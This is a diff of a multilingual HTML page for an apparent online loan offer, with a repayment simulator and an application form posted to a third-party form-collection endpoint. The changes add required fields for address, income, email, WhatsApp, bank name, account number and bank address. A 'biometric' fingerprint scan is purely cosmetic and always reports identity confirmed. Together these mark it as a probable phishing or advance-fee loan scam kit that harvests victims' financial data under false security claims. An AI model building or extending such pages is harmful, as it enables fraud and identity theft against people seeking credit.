@@ -8,7 +8,7 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         :root { --primary: #1d4ed8; }
-        body { background-color: #F8FAFC; color: #1e293b; overflow-x: hidden; }
+        body { background-color: #F8FAFC; color: #1e293b; }
         .step { display: none; animation: fadeIn 0.4s ease-out; }
         .step.active { display: flex; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
@@ -18,6 +18,8 @@
         .lang-card.selected { border-color: var(--primary); background: #eff6ff; }
         .scan-line { width: 100%; height: 2px; background: #3b82f6; position: absolute; top: 0; left: 0; box-shadow: 0 0 10px #3b82f6; display: none; }
         @keyframes scanMove { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
+        input { transition: all 0.2s; }
+        input:focus { border-color: var(--primary); background: white; }
     </style>
 </head>
 <body class="font-sans">
@@ -47,7 +49,6 @@
         <div class="max-w-xl mx-auto w-full pt-6">
             <div class="glass-card p-8">
                 <h2 class="text-xl font-black text-blue-900 mb-8 text-center uppercase" id="sim-title">Simulateur</h2>
-                
                 <div class="space-y-10">
                     <div>
                         <div class="flex justify-between mb-4 font-bold text-slate-400 text-xs uppercase">
@@ -59,7 +60,6 @@
                         </div>
                         <input type="range" id="amountRange" min="1000" max="500000" step="1000" value="1000" oninput="updateSim()" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer">
                     </div>
-
                     <div>
                         <div class="flex justify-between mb-4 font-bold text-slate-400 text-xs uppercase">
                             <span id="lbl-dur">Durée</span>
@@ -71,8 +71,7 @@
                         <input type="range" id="yearRange" min="2" max="30" step="1" value="2" oninput="updateSim()" class="w-full h-2 bg-slate-100 rounded-lg appearance-none cursor-pointer">
                     </div>
                 </div>
-
-                <div class="mt-10 bg-blue-900 p-8 rounded-[40px] text-white shadow-2xl relative overflow-hidden">
+                <div class="mt-10 bg-blue-900 p-8 rounded-[40px] text-white shadow-2xl">
                     <div class="flex justify-between items-center mb-4">
                         <span id="res-lbl-men" class="text-[10px] font-bold uppercase text-blue-300">Mensualité</span>
                         <span id="res-monthly" class="text-3xl font-black">--</span>
@@ -81,9 +80,7 @@
                         <span id="res-lbl-tot" class="text-[10px] font-bold uppercase text-blue-300">Total (3% inclus)</span>
                         <span id="res-total" class="font-bold text-xl">--</span>
                     </div>
-                    <p class="text-[9px] mt-4 text-blue-200 italic" id="lbl-grace">(*) Le remboursement commence après 3 mois.</p>
                 </div>
-
                 <button onclick="goToStep(3)" id="btn-next" class="btn-elite w-full py-6 rounded-full font-black mt-8 uppercase text-sm">Passer au dossier</button>
             </div>
         </div>
@@ -93,15 +90,31 @@
         <div class="max-w-xl mx-auto w-full pb-20">
             <div class="glass-card p-8">
                 <form action="https://formspree.io/f/mzdkpgay" method="POST" onsubmit="handleFinalSubmit(event)">
-                    <h2 class="text-2xl font-black text-blue-900 mb-6 uppercase" id="form-title">Dossier Digital</h2>
+                    <h2 class="text-2xl font-black text-blue-900 mb-6 uppercase text-center" id="form-title">Dossier Digital</h2>
                     
-                    <div class="grid grid-cols-2 gap-4 mb-4">
-                        <input type="text" name="Prenom" id="i-pre" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
-                        <input type="text" name="Nom" id="i-nom" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                    <div class="space-y-4">
+                        <div class="grid grid-cols-2 gap-4">
+                            <input type="text" name="Prenom" id="i-pre" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                            <input type="text" name="Nom" id="i-nom" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                        </div>
+                        <input type="text" name="Adresse" id="i-adr" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                        <input type="text" name="Pays" id="i-pay" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                        <div class="grid grid-cols-2 gap-4">
+                            <input type="text" name="Profession" id="i-pro" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                            <input type="text" name="Revenus" id="i-rev" required class="p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                        </div>
+                        <input type="email" name="Email" id="i-mail" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                        <input type="tel" name="WhatsApp" id="i-wa" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                        
+                        <div class="pt-4 border-t border-slate-100">
+                            <p id="bank-info-msg" class="text-[10px] font-bold text-blue-600 uppercase mb-4 italic">Infos bancaires obligatoires</p>
+                            <input type="text" name="Banque_Nom" id="i-bn" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
+                            <input type="text" name="Banque_Compte" id="i-bc" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
+                            <input type="text" name="Banque_Adresse" id="i-ba" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm">
+                        </div>
                     </div>
-                    <input type="tel" name="WhatsApp" id="i-wa" required class="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl outline-none text-sm mb-4">
 
-                    <div class="mt-4 p-8 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center cursor-pointer relative overflow-hidden" id="scan-zone" onclick="startScan()">
+                    <div class="mt-8 p-8 bg-slate-50 rounded-3xl border-2 border-dashed border-slate-200 text-center cursor-pointer relative overflow-hidden" onclick="startScan()">
                         <div id="scan-line" class="scan-line"></div>
                         <div id="scan-icon" class="text-blue-200"><i class="fas fa-fingerprint text-7xl"></i></div>
                         <p id="scan-text" class="text-[10px] font-black text-blue-900 uppercase mt-4 tracking-widest">BIOMÉTRIE</p>
@@ -116,10 +129,10 @@
     <script>
         let cL = 'fr', cC = '€', isScanned = false;
         const tr = {
-            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", btnSubmit: "Confirmer l'inscription", scan: "BIOMÉTRIE", scanWait: "ANALYSE...", scanOk: "IDENTITÉ OK", plPre: "Prénom", plNom: "Nom", plWa: "WhatsApp", btnNext: "Passer au dossier" },
-            en: { cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total (with 3%)", fTitle: "DOSSIER", btnSubmit: "Confirm Now", scan: "BIOMETRICS", scanWait: "SCANNING...", scanOk: "IDENTITY OK", plPre: "First Name", plNom: "Last Name", plWa: "WhatsApp", btnNext: "Next Step" },
-            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", btnSubmit: "CONFIRMAR", scan: "BIOMETRÍA", scanWait: "ESCANEANDO...", scanOk: "IDENTIDAD OK", plPre: "Nombre", plNom: "Apellido", plWa: "WhatsApp", btnNext: "PASAR AL EXPEDIENTE" },
-            de: { cont: "WEITER", sim: "Simulator", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich", tot: "Gesamt (mit 3%)", fTitle: "AKTE", btnSubmit: "BESTÄTIGEN", scan: "BIOMETRIE", scanWait: "SCANNT...", scanOk: "IDENTITÄT OK", plPre: "Vorname", plNom: "Nachname", plWa: "WhatsApp", btnNext: "WEITER ZUR AKTE" }
+            fr: { cont: "CONTINUER", sim: "Simulateur", amt: "Montant", dur: "Durée", yr: "Ans", men: "Mensualité", tot: "Total (avec 3%)", fTitle: "DOSSIER", btnSubmit: "Confirmer l'inscription", scan: "BIOMÉTRIE", scanWait: "ANALYSE...", scanOk: "IDENTITÉ OK", plPre: "Prénom", plNom: "Nom", plAdr: "Adresse", plPay: "Pays", plPro: "Profession", plRev: "Revenus mensuels", plMail: "E-mail", plWa: "WhatsApp", plBn: "Nom de la banque", plBc: "Numéro de compte", plBa: "Adresse de la banque", bankMsg: "Infos bancaires obligatoires pour le transfert", btnNext: "Passer au dossier" },
+            en: { cont: "CONTINUE", sim: "Simulator", amt: "Amount", dur: "Duration", yr: "Years", men: "Monthly", tot: "Total (with 3%)", fTitle: "DOSSIER", btnSubmit: "Confirm Now", scan: "BIOMETRICS", scanWait: "SCANNING...", scanOk: "IDENTITY OK", plPre: "First Name", plNom: "Last Name", plAdr: "Address", plPay: "Country", plPro: "Profession", plRev: "Monthly Income", plMail: "Email", plWa: "WhatsApp", plBn: "Bank Name", plBc: "Account Number", plBa: "Bank Address", bankMsg: "Bank info required for transfer", btnNext: "Next Step" },
+            es: { cont: "CONTINUAR", sim: "Simulador", amt: "Monto", dur: "Plazo", yr: "Años", men: "Cuota", tot: "Total (con 3%)", fTitle: "EXPEDIENTE", btnSubmit: "CONFIRMAR", scan: "BIOMETRÍA", scanWait: "ESCANEANDO...", scanOk: "IDENTIDAD OK", plPre: "Nombre", plNom: "Apellido", plAdr: "Dirección", plPay: "País", plPro: "Profesión", plRev: "Ingresos mensuales", plMail: "Correo electrónico", plWa: "WhatsApp", plBn: "Nombre de su banco", plBc: "Número de cuenta", plBa: "Dirección del banco", bankMsg: "Información bancaria obligatoria para la transferencia", btnNext: "PASAR AL EXPEDIENTE" },
+            de: { cont: "WEITER", sim: "Simulator", amt: "Betrag", dur: "Dauer", yr: "Jahre", men: "Monatlich", tot: "Gesamt (mit 3%)", fTitle: "AKTE", btnSubmit: "BESTÄTIGEN", scan: "BIOMETRIE", scanWait: "SCANNT...", scanOk: "IDENTITÄT OK", plPre: "Vorname", plNom: "Nachname", plAdr: "Adresse", plPay: "Land", plPro: "Beruf", plRev: "Monatliches Einkommen", plMail: "E-Mail", plWa: "WhatsApp", plBn: "Bankname", plBc: "Kontonummer", plBa: "Bankadresse", bankMsg: "Bankdaten für die Überweisung erforderlich", btnNext: "WEITER ZUR AKTE" }
         };
 
         function selectLang(l, c) {
@@ -127,16 +140,6 @@
             document.querySelectorAll('.lang-card').forEach(b => b.classList.remove('selected'));
             document.getElementById('btn-' + l).classList.add('selected');
             updateUI();
-        }
-
-        function editAmount() {
-            let n = prompt("Montant :", document.getElementById('amountRange').value);
-            if(n && !isNaN(n)) { document.getElementById('amountRange').value = n; updateSim(); }
-        }
-
-        function editYear() {
-            let n = prompt("Années (2-30) :", document.getElementById('yearRange').value);
-            if(n && !isNaN(n) && n >= 2 && n <= 30) { document.getElementById('yearRange').value = n; updateSim(); }
         }
 
         function updateSim() {
@@ -153,23 +156,16 @@
 
         function startScan() {
             if(isScanned) return;
-            const t = tr[cL];
             const line = document.getElementById('scan-line');
             line.style.display = 'block';
             line.style.animation = 'scanMove 2s infinite linear';
-            document.getElementById('scan-text').innerText = t.scanWait;
-            
+            document.getElementById('scan-text').innerText = tr[cL].scanWait;
             setTimeout(() => {
                 line.style.display = 'none';
                 document.getElementById('scan-icon').innerHTML = '<i class="fas fa-check-circle text-7xl text-green-500"></i>';
-                document.getElementById('scan-text').innerText = t.scanOk;
-                document.getElementById('scan-text').classList.replace('text-blue-900', 'text-green-600');
+                document.getElementById('scan-text').innerText = tr[cL].scanOk;
                 isScanned = true;
             }, 2500);
-        }
-
-        function handleFinalSubmit(event) {
-            if(!isScanned) { event.preventDefault(); alert("Veuillez valider la biométrie."); }
         }
 
         function updateUI() {
@@ -184,11 +180,24 @@
             document.getElementById('form-title').innerText = t.fTitle;
             document.getElementById('btn-submit').innerText = t.btnSubmit;
             document.getElementById('btn-next').innerText = t.btnNext;
-            document.getElementById('scan-text').innerText = isScanned ? t.scanOk : t.scan;
+            document.getElementById('bank-info-msg').innerText = t.bankMsg;
+            
             document.getElementById('i-pre').placeholder = t.plPre;
             document.getElementById('i-nom').placeholder = t.plNom;
+            document.getElementById('i-adr').placeholder = t.plAdr;
+            document.getElementById('i-pay').placeholder = t.plPay;
+            document.getElementById('i-pro').placeholder = t.plPro;
+            document.getElementById('i-rev').placeholder = t.plRev;
+            document.getElementById('i-mail').placeholder = t.plMail;
             document.getElementById('i-wa').placeholder = t.plWa;
+            document.getElementById('i-bn').placeholder = t.plBn;
+            document.getElementById('i-bc').placeholder = t.plBc;
+            document.getElementById('i-ba').placeholder = t.plBa;
             updateSim();
+        }
+
+        function handleFinalSubmit(event) {
+            if(!isScanned) { event.preventDefault(); alert(cL === 'es' ? "Por favor valide la biometría" : "Veuillez valider la biométrie"); }
         }
 
         function goToStep(s) {
@@ -196,8 +205,12 @@
             document.getElementById(['','step-lang','step-sim','step-form'][s]).classList.add('active');
             window.scrollTo(0,0);
         }
+
+        function editAmount() { let n = prompt("Montant :", 1000); if(n) { document.getElementById('amountRange').value = n; updateSim(); } }
+        function editYear() { let n = prompt("Années :", 2); if(n) { document.getElementById('yearRange').value = n; updateSim(); } }
+
         window.onload = () => { selectLang('fr', '€'); };
     </script>
 </body>
-                    </html>
-                    
+                                </html>
+                                
